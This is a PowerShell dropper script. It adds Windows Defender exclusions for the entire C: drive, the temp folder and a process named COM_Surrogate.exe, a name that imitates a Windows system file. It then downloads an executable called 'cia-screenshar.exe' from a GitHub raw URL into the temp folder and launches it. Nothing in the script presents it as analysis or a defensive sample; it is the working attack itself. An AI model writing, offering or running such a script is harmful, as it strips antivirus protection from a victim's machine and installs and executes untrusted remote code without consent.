Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath "$env:temp"
Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
$url = "https://raw.githubusercontent.com/M7mmdddd/psps/refs/heads/main/cia-screenshar.exe"

 $output = "$env:TEMP\cia-screenshar.exe"

Invoke-WebRequest -Uri $url -OutFile $output

if (Test-Path $output) {
    Start-Process -FilePath $output
} else {
    Write-Host "Failed to download the file."
}
